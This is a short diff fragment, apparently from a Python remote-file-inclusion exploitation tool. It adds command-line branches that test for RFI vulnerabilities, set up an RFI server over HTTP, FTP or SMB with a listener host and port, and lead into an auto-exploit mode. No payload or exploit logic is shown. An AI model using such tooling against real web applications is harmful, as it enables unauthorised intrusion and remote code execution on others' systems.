+        exploiter.target_url = original_url
+        exploiter.parameter = original_param
+        sys.exit(0)
+    
+    if args.test_rfi:
+        exploiter.test_rfi_vulnerability()
+        print(f"\n{Fore.YELLOW}[*] To setup RFI server, use:{Style.RESET_ALL}")
+        print(f"  --rfi-setup http")
+        print(f"  --rfi-setup ftp")
+        print(f"  --rfi-setup smb")
+        sys.exit(0)
+    
+    # RFI Setup
+    if args.rfi_setup:
+        exploiter.setup_rfi_server(args.rfi_setup, args.rfi_lhost, args.rfi_lport)
         sys.exit(0)
     
     # Auto-exploit mode
